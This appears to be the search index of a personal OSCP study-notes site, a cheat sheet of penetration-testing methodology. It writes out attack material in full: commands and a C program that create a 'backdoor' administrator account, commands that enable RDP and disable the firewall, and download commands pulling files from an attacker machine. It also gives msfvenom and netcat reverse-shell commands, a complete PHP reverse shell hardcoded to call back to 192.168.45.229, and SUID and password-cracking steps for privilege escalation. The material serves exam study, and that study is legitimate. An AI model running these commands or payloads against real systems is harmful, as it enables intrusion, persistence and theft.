{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"About Me","text":""},{"location":"#whoami","title":"whoami","text":"<p>As a dedicated cybersecurity professional, I am passionate about safeguarding digital assets and advancing the security landscape. Equipped with a strong technical background and keen interest lifelong learning, I constantly challenge myself to pick up new skills in the IT and engineering domain.</p>"},{"location":"#socials","title":"Socials","text":"<p> LinkedIn Github </p>"},{"location":"OSCP/Methodology/Add%20RDP%20Functionality/","title":"Add RDP Functionality","text":""},{"location":"OSCP/Methodology/Add%20RDP%20Functionality/#add-new-user","title":"Add new user","text":"<pre><code>net user /add backdoor Password1\n</code></pre>"},{"location":"OSCP/Methodology/Add%20RDP%20Functionality/#add-new-user-to-administrators-group","title":"Add new user to Administrators group","text":"<pre><code>net localgroup administrators /add backdoor\n</code></pre>"},{"location":"OSCP/Methodology/Add%20RDP%20Functionality/#enable-rdp-using-registry","title":"Enable RDP using registry","text":"<pre><code>reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0 /f\n</code></pre>"},{"location":"OSCP/Methodology/Add%20RDP%20Functionality/#turn-off-firewall","title":"Turn off firewall","text":"<pre><code>netsh advfirewall set allprofiles state off\n</code></pre>"},{"location":"OSCP/Methodology/Adding%20new%20user%20with%20admin%20rights/","title":"Adding new user with admin rights","text":""},{"location":"OSCP/Methodology/Adding%20new%20user%20with%20admin%20rights/#powershell","title":"Powershell","text":"<pre><code># Create the new user\n$Username = \"backdoor\"\n$Password = ConvertTo-SecureString \"Password1\" -AsPlainText -Force\nNew-LocalUser -Name $Username -Password $Password -FullName \"Backdoor User\" -Description \"User with administrative privileges\" -PasswordNeverExpires -UserMayNotChangePassword\n\n# Add the user to the Administrators group\nAdd-LocalGroupMember -Group \"Administrators\" -Member $Username\n</code></pre>"},{"location":"OSCP/Methodology/Adding%20new%20user%20with%20admin%20rights/#c-code","title":"C code","text":"<p><pre><code>#include &lt;stdlib.h&gt;\n\nint main ()\n{\n  int i;\n\n  i = system (\"net user backdoor Password1 /add\");\n  i = system (\"net localgroup administrators backdoor /add\");\n\n  return 0;\n}\n</code></pre> Compile using gcc <pre><code>x86_64-w64-mingw32-gcc adduser.c -o adduser.exe\n</code></pre></p>"},{"location":"OSCP/Methodology/Enumeration/","title":"Enumeration","text":""},{"location":"OSCP/Methodology/Enumeration/#autorecon","title":"Autorecon","text":"<p>On standalone devices, run Autorecon <pre><code>autorecon 192.168.177.151 192.168.177.152 192.168.177.153\n</code></pre></p>"},{"location":"OSCP/Methodology/Enumeration/#nmap","title":"Nmap","text":"<p>Run initial Nmap scan to determine what ports are open Full scan <pre><code>nmap -Pn 192.168.177.161 -p-\n</code></pre></p> <p>Fast (may encounter missing ports) <pre><code>nmap --min-rate 4500 --max-rtt-timeout 1500ms 192.168.211.52 -p-\n</code></pre></p> <p>After obtaining open port numbers, run enhanced scan on the ports <pre><code>nmap -Pn 192.168.177.161 -p 80,135,139,445 -T4 -A -oN enum/nmap.txt\n</code></pre></p>"},{"location":"OSCP/Methodology/Enumeration/#directory-enumeration","title":"Directory Enumeration","text":"<p>If any HTTP ports available, eg 80, 8000, 8080</p>"},{"location":"OSCP/Methodology/Enumeration/#gobuster","title":"gobuster","text":"<pre><code>gobuster -u http://&lt;ip-addr&gt;:&lt;port&gt; -w /usr/share/wordlists/dirb/common.txt\ngobuster -u http://&lt;ip-addr&gt;:&lt;port&gt; -w /usr/share/wordlists/dirb/big.txt\ngobuster -u http://&lt;ip-addr&gt;:&lt;port&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n</code></pre>"},{"location":"OSCP/Methodology/Enumeration/#feroxbuster","title":"feroxbuster","text":"<pre><code>feroxbuster --url http://&lt;ip-addr&gt;:&lt;port&gt;\n</code></pre>"},{"location":"OSCP/Methodology/Enumeration/#website-fingerprinting","title":"Website Fingerprinting","text":""},{"location":"OSCP/Methodology/Enumeration/#whatweb","title":"Whatweb","text":"<pre><code>whatweb http://&lt;ip-addr&gt;:&lt;port&gt;\n</code></pre>"},{"location":"OSCP/Methodology/Enumeration/#view-page-source","title":"View Page Source","text":"<p>On a webpage, right click to view the source code of the page</p> <p></p> <p>Look for relevant interesting info, eg software used, version, etc</p>"},{"location":"OSCP/Methodology/Enumeration/#smb-enumeration","title":"SMB enumeration","text":"<p>Upon seeing port 445 or any SMB port, try connecting using <code>smbclient</code> <pre><code># list shares\nsmbclient -L &lt;ip-addr&gt;\n\n# connect to share\nsmbclient //&lt;ip-addr&gt;/&lt;share-name&gt;\n</code></pre></p>"},{"location":"OSCP/Methodology/Enumeration/#ldap-enumeration","title":"LDAP enumeration","text":"<p>Upon seeing classic Domain Controller ports, eg 88, 389, 3268 etc, try using <code>ldapsearch</code> Reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap ![[Pasted image 20240818152333.png]] <pre><code>ldapsearch -x -H ldap://&lt;DC-IP&gt; -D '' -w '' -b \"DC=&lt;DC-Subdomain&gt;,DC=&lt;TLD&gt;\n</code></pre> There might be passwords or other interesting info </p>"},{"location":"OSCP/Methodology/Enumeration/#random-things-to-try","title":"Random things to try","text":"<p>Try inputting the hostname everywhere, eg in website paths, as credentials etc</p>"},{"location":"OSCP/Methodology/Exfiltration/","title":"Exfiltration","text":""},{"location":"OSCP/Methodology/Exfiltration/#from-kali-to-victim","title":"From kali to victim","text":"<p>On victim machine, </p> <pre><code># certutil\ncertutil.exe -urlcache -f http://&lt;kali-ip&gt;:&lt;port&gt;/&lt;filename&gt; &lt;filename-to-save&gt;\n\n# wget\nwget http://&lt;kali-ip&gt;:&lt;port&gt;/&lt;filename&gt;\n\n# curl\ncurl http://&lt;kali-ip&gt;:&lt;port&gt;/&lt;filename&gt; -o &lt;filename-to-save&gt;\n\n# powershell\niwr -uri http://&lt;kali-ip&gt;:&lt;port&gt;/&lt;filename&gt; -outfile &lt;filename-to-save&gt;\n</code></pre>"},{"location":"OSCP/Methodology/Exfiltration/#from-victim-to-kali","title":"From victim to kali","text":"<p>Refer to https://csbygb.gitbook.io/pentips/post-exploitation/file-transfers Note: if face error with SCP, try using <code>-T</code> or <code>-O</code> options</p>"},{"location":"OSCP/Methodology/Exploitation/","title":"Exploitation","text":""},{"location":"OSCP/Methodology/Exploitation/#searching-for-exploits","title":"Searching for exploits","text":"<p>Start with <code>searchsploit</code> <pre><code>searchsploit &lt;keywords&gt;\n</code></pre> Once exploit is determined, download it to current folder using  <pre><code>searchsploit -m &lt;exploit number&gt;\n</code></pre></p> <p>If unable to find on searchsploit, use google, eg: \\ exploit github"},{"location":"OSCP/Methodology/Exploitation/#service-hash-capturing","title":"Service hash capturing","text":"<p>Use use responder <pre><code>sudo responder -I tun0\n</code></pre></p> <p>Types supported <pre><code>[+] Servers:\n    HTTP server                [ON]\n    HTTPS server               [ON]\n    WPAD proxy                 [OFF]\n    Auth proxy                 [OFF]\n    SMB server                 [ON]\n    Kerberos server            [ON]\n    SQL server                 [ON]\n    FTP server                 [ON]\n    IMAP server                [ON]\n    POP3 server                [ON]\n    SMTP server                [ON]\n    DNS server                 [ON]\n    LDAP server                [ON]\n    MQTT server                [ON]\n    RDP server                 [ON]\n    DCE-RPC server             [ON]\n    WinRM server               [ON]\n    SNMP server                [OFF]\n</code></pre> Use service to send traffic to kali host. Eg, victim has functionality in the browser send out traffic, probably through SMB</p>"},{"location":"OSCP/Methodology/Exploitation/#webdav","title":"WebDav","text":"<p>Upon discovering \"http-webdav-scan\" results from initial nmap scan providing results, such as: <pre><code>80/tcp   open  http          Microsoft IIS httpd 10.0\n\n...\n\n|_http-title: IIS Windows Server\n| http-webdav-scan: \n|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK\n</code></pre> Try using the cadaver tool (functions similar to ftp). Can use to upload webshell, for example. Reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav</p>"},{"location":"OSCP/Methodology/Exploitation/#python3-tty-shell","title":"Python3 TTY shell","text":"<p>After initial access, use this command to elevate the shell to a TTY shell for more functionality <pre><code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre></p>"},{"location":"OSCP/Methodology/Exploitation/#ftp","title":"FTP","text":"<p>Sometimes, after getting ftp access (eg through <code>admin:admin</code> or <code>anonymous:anonoymous</code>), we face an issue when trying to use the <code>ls</code> command to list files <pre><code>ftp&gt; ls\n229 Entering Extended Passive Mode (|||12600|)\n</code></pre> The shell will be indefinitely stuck at the <code>Entering Extended Passive Mode</code> error.</p> <p>Solution: Type in <code>passive</code> before using the <code>ls</code> command <pre><code>\u2514\u2500$ ftp 192.168.156.56\nConnected to 192.168.156.56.\n220 (vsFTPd 3.0.3)\nName (192.168.156.56:kali): admin\n331 Please specify the password.\nPassword: \n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp&gt; passive\nPassive mode: off; fallback to active mode: off.\nftp&gt; ls\n200 EPRT command successful. Consider using EPSV.\n150 Here comes the directory listing.\ndrwxr-xr-x    2 1001     0            4096 May 26  2020 contac\ndrwxr-xr-x    2 1001     0            4096 May 26  2020 css\ndrwxr-xr-x    3 1001     0            4096 May 26  2020 img\n-rw-r--r--    1 1001     0           23364 May 27  2020 index.\ndrwxr-xr-x    2 1001     0            4096 May 26  2020 js\ndrwxr-xr-x   11 1001     0            4096 May 26  2020 lib\n</code></pre></p>"},{"location":"OSCP/Methodology/Linux%20Privesc/","title":"Linux Privesc","text":"<p>If all else fails, consult https://book.hacktricks.xyz/linux-hardening/privilege-escalation</p>"},{"location":"OSCP/Methodology/Linux%20Privesc/#adding-suid-to-binaries","title":"Adding SUID to binaries","text":"<p>Instead of getting a reverse shell, consider adding the SUID bit to <code>/bin/bash</code> instead. <pre><code>chmod +s /bin/bash\n</code></pre></p> <p>Applications: Running in scheduled task</p> <p>After scheduled task has executed, run the following to go into privileged shell <pre><code>bash -p\n</code></pre> We will get a root shell</p>"},{"location":"OSCP/Methodology/Linux%20Privesc/#unprivileged-linux-process-snooping","title":"Unprivileged linux process snooping","text":"<p>Inspect processes without need for root privileges, such as seeing commands by other users, cron jobs, etc.</p> <p>https://github.com/DominicBreuker/pspy</p> <p>Download binary and transfer to victim machine to execute. Look out for strange processes executing commands as root</p>"},{"location":"OSCP/Methodology/Linux%20Privesc/#mail-servers","title":"Mail Servers","text":"<p>If email ports are open, eg port 25 etc. Locate folder that stores mail and read the mail within <pre><code>cd /var/mail\n</code></pre></p>"},{"location":"OSCP/Methodology/Linux%20Privesc/#search-for-filenames","title":"Search for filenames","text":"<p>https://www.plesk.com/blog/various/find-files-in-linux-via-command-line/ <pre><code>find / -name \"filename.txt\"\nfind / -name \"*.txt\"\n</code></pre></p>"},{"location":"OSCP/Methodology/Linux%20Privesc/#unshadow","title":"Unshadow","text":"<p>If able to obtain the <code>/etc/passwd</code> and <code>/etc/shadow</code> files from a linux server, use the unshadow technique to obtain hashes for cracking. Reference: https://erev0s.com/blog/cracking-etcshadow-john/ <pre><code>unshadow passwd shadow &gt; unshadowed.txt\n</code></pre></p> <p>Then, use <code>john</code> to crack the hash <pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt\n</code></pre></p>"},{"location":"OSCP/Methodology/Linux%20Privesc/#using-application-accounts","title":"Using Application Accounts","text":"<p>It is important to try and get access to an account used by applications to run, eg xampp. This is because these accounts usually have the <code>SeImpersonatePrivilege</code> required for privesc.</p> <p>Common access vector: upload php/aspx webshell to the respective webroots (eg <code>C:\\xampp\\htdocs</code>) and access them by accessing the location they are uploaded through the web browser (eg. `http:///backdoor.php)"},{"location":"OSCP/Methodology/Reverse%20shells/","title":"Reverse shells","text":""},{"location":"OSCP/Methodology/Reverse%20shells/#msfvenom","title":"msfvenom","text":"<pre><code># windows\nmsfvenom -p windows/shell_reverse_tcp LHOST=&lt;kali-ip&gt; LPORT=&lt;kali-port&gt; -f exe -o reverse.exe\n\n# linux\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;kali-ip&gt; LPORT=&lt;kali-port&gt; -f elf -o reverse.elf\n</code></pre>"},{"location":"OSCP/Methodology/Reverse%20shells/#ncexe-revshellscom","title":"nc.exe (revshells.com)","text":"<pre><code>nc.exe &lt;kali-ip&gt; &lt;kali-port&gt; -e powershell\n</code></pre>"},{"location":"OSCP/Methodology/Reverse%20shells/#powershell","title":"Powershell","text":"<p>Use http://revshells.com to generate PowerShell #3 (Base64)</p>"},{"location":"OSCP/Methodology/Reverse%20shells/#php","title":"php","text":"<pre><code>&lt;?php\n// Copyright (c) 2020 Ivan Sincek\n// v2.3\n// Requires PHP v5.0.0 or greater.\n// Works on Linux OS, macOS, and Windows OS.\n// See the original script at https://github.com/pentestmonkey/php-reverse-shell.\nclass Shell {\n    private $addr  = null;\n    private $port  = null;\n    private $os    = null;\n    private $shell = null;\n    private $descriptorspec = array(\n        0 =&gt; array('pipe', 'r'), // shell can read from STDIN\n        1 =&gt; array('pipe', 'w'), // shell can write to STDOUT\n        2 =&gt; array('pipe', 'w')  // shell can write to STDERR\n    );\n    private $buffer  = 1024;    // read/write buffer size\n    private $clen    = 0;       // command length\n    private $error   = false;   // stream read/write error\n    public function __construct($addr, $port) {\n        $this-&gt;addr = $addr;\n        $this-&gt;port = $port;\n    }\n    private function detect() {\n        $detected = true;\n        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS\n            $this-&gt;os    = 'LINUX';\n            $this-&gt;shell = 'powershell';\n        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {\n            $this-&gt;os    = 'WINDOWS';\n            $this-&gt;shell = 'cmd.exe';\n        } else {\n            $detected = false;\n            echo \"SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n\";\n        }\n        return $detected;\n    }\n    private function daemonize() {\n        $exit = false;\n        if (!function_exists('pcntl_fork')) {\n            echo \"DAEMONIZE: pcntl_fork() does not exists, moving on...\\n\";\n        } else if (($pid = @pcntl_fork()) &lt; 0) {\n            echo \"DAEMONIZE: Cannot fork off the parent process, moving on...\\n\";\n        } else if ($pid &gt; 0) {\n            $exit = true;\n            echo \"DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n\";\n        } else if (posix_setsid() &lt; 0) {\n            // once daemonized you will actually no longer see the script's dump\n            echo \"DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n\";\n        } else {\n            echo \"DAEMONIZE: Completed successfully!\\n\";\n        }\n        return $exit;\n    }\n    private function settings() {\n        @error_reporting(0);\n        @set_time_limit(0); // do not impose the script execution time limit\n        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories\n    }\n    private function dump($data) {\n        $data = str_replace('&lt;', '&amp;lt;', $data);\n        $data = str_replace('&gt;', '&amp;gt;', $data);\n        echo $data;\n    }\n    private function read($stream, $name, $buffer) {\n        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream\n            $this-&gt;error = true;                            // set global error flag\n            echo \"STRM_ERROR: Cannot read from ${name}, script will now exit...\\n\";\n        }\n        return $data;\n    }\n    private function write($stream, $name, $data) {\n        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream\n            $this-&gt;error = true;                            // set global error flag\n            echo \"STRM_ERROR: Cannot write to ${name}, script will now exit...\\n\";\n        }\n        return $bytes;\n    }\n    // read/write method for non-blocking streams\n    private function rw($input, $output, $iname, $oname) {\n        while (($data = $this-&gt;read($input, $iname, $this-&gt;buffer)) &amp;&amp; $this-&gt;write($output, $oname, $data)) {\n            if ($this-&gt;os === 'WINDOWS' &amp;&amp; $oname === 'STDIN') { $this-&gt;clen += strlen($data); } // calculate the command length\n            $this-&gt;dump($data); // script's dump\n        }\n    }\n    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)\n    // we must read the exact byte length from a stream and not a single byte more\n    private function brw($input, $output, $iname, $oname) {\n        $fstat = fstat($input);\n        $size = $fstat['size'];\n        if ($this-&gt;os === 'WINDOWS' &amp;&amp; $iname === 'STDOUT' &amp;&amp; $this-&gt;clen) {\n            // for some reason Windows OS pipes STDIN into STDOUT\n            // we do not like that\n            // we need to discard the data from the stream\n            while ($this-&gt;clen &gt; 0 &amp;&amp; ($bytes = $this-&gt;clen &gt;= $this-&gt;buffer ? $this-&gt;buffer : $this-&gt;clen) &amp;&amp; $this-&gt;read($input, $iname, $bytes)) {\n                $this-&gt;clen -= $bytes;\n                $size -= $bytes;\n            }\n        }\n        while ($size &gt; 0 &amp;&amp; ($bytes = $size &gt;= $this-&gt;buffer ? $this-&gt;buffer : $size) &amp;&amp; ($data = $this-&gt;read($input, $iname, $bytes)) &amp;&amp; $this-&gt;write($output, $oname, $data)) {\n            $size -= $bytes;\n            $this-&gt;dump($data); // script's dump\n        }\n    }\n    public function run() {\n        if ($this-&gt;detect() &amp;&amp; !$this-&gt;daemonize()) {\n            $this-&gt;settings();\n\n            // ----- SOCKET BEGIN -----\n            $socket = @fsockopen($this-&gt;addr, $this-&gt;port, $errno, $errstr, 30);\n            if (!$socket) {\n                echo \"SOC_ERROR: {$errno}: {$errstr}\\n\";\n            } else {\n                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS\n\n                // ----- SHELL BEGIN -----\n                $process = @proc_open($this-&gt;shell, $this-&gt;descriptorspec, $pipes, null, null);\n                if (!$process) {\n                    echo \"PROC_ERROR: Cannot start the shell\\n\";\n                } else {\n                    foreach ($pipes as $pipe) {\n                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS\n                    }\n\n                    // ----- WORK BEGIN -----\n                    $status = proc_get_status($process);\n                    @fwrite($socket, \"SOCKET: Shell has connected! PID: \" . $status['pid'] . \"\\n\");\n                    do {\n                        $status = proc_get_status($process);\n                        if (feof($socket)) { // check for end-of-file on SOCKET\n                            echo \"SOC_ERROR: Shell connection has been terminated\\n\"; break;\n                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running\n                            echo \"PROC_ERROR: Shell process has been terminated\\n\";   break; // feof() does not work with blocking streams\n                        }                                                                    // use proc_get_status() instead\n                        $streams = array(\n                            'read'   =&gt; array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR\n                            'write'  =&gt; null,\n                            'except' =&gt; null\n                        );\n                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS\n                        if ($num_changed_streams === false) {\n                            echo \"STRM_ERROR: stream_select() failed\\n\"; break;\n                        } else if ($num_changed_streams &gt; 0) {\n                            if ($this-&gt;os === 'LINUX') {\n                                if (in_array($socket  , $streams['read'])) { $this-&gt;rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN\n                                if (in_array($pipes[2], $streams['read'])) { $this-&gt;rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET\n                                if (in_array($pipes[1], $streams['read'])) { $this-&gt;rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET\n                            } else if ($this-&gt;os === 'WINDOWS') {\n                                // order is important\n                                if (in_array($socket, $streams['read'])/*------*/) { $this-&gt;rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN\n                                if (($fstat = fstat($pipes[2])) &amp;&amp; $fstat['size']) { $this-&gt;brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET\n                                if (($fstat = fstat($pipes[1])) &amp;&amp; $fstat['size']) { $this-&gt;brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET\n                            }\n                        }\n                    } while (!$this-&gt;error);\n                    // ------ WORK END ------\n\n                    foreach ($pipes as $pipe) {\n                        fclose($pipe);\n                    }\n                    proc_close($process);\n                }\n                // ------ SHELL END ------\n\n                fclose($socket);\n            }\n            // ------ SOCKET END ------\n\n        }\n    }\n}\necho '&lt;pre&gt;';\n// change the host address and/or port number as necessary\n$sh = new Shell('192.168.45.229', 80);\n$sh-&gt;run();\nunset($sh);\n// garbage collector requires PHP v5.3.0 or greater\n// @gc_collect_cycles();\necho '&lt;/pre&gt;';\n?&gt;\n</code></pre>"},{"location":"OSCP/Methodology/Windows%20Privesc/","title":"Windows Privesc","text":"<p>If all else fails, refer to: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation</p> <p>Search for interesting files <pre><code>#list file structure\ntree /f /a\n\n#find filetypes (edit filetypes accordingly)\n#cmd\ndir /s/b C:\\*kdbx\n#powershell\nGet-ChildItem -Path C:\\Users -Include *.txt,*.ini,*.pdf,*.kdbx,*.exe -Recurse -ErrorAction SilentlyContinue\n</code></pre></p> <ul> <li> <p>Check PowerShell history of a user <pre><code>Get-History\n</code></pre></p> </li> <li> <p><code>Clear-History</code> does not clear the command history recorded by <code>PSReadline</code> </p> </li> <li>Use <code>Get-PSReadlineOption</code> to obtain information <pre><code>(Get-PSReadlineOption).HistorySavePath\n</code></pre></li> <li>This displays the path of the history file from PSReadline. Use <code>type</code> command to view the file content <pre><code>type C:\\Users\\dave\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n</code></pre></li> </ul>"},{"location":"OSCP/Methodology/Windows%20Privesc/#add-new-user","title":"Add new user","text":"<pre><code>net user /add backdoor Password1\n</code></pre>"},{"location":"OSCP/Methodology/Windows%20Privesc/#add-new-user-to-administrators-group","title":"Add new user to Administrators group","text":"<p><pre><code>net localgroup administrators /add backdoor\n</code></pre> These commands useful when using GodPotato for example</p>"},{"location":"OSCP/Methodology/Windows%20Privesc/#alwaysinstallelevated","title":"AlwaysInstallElevated","text":"<p><pre><code>reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n</code></pre> If these 2 registers are enabled (value is 0x1), then users of any privilege can install (execute) <code>*.msi</code> files as NT AUTHORITY\\SYSTEM</p> <p>Use <code>msfvenom</code> to generate windows reverse shell binary in <code>.msi</code> format</p>"},{"location":"blog/","title":"Index","text":""},{"location":"blog/#blog","title":"Blog","text":""}]}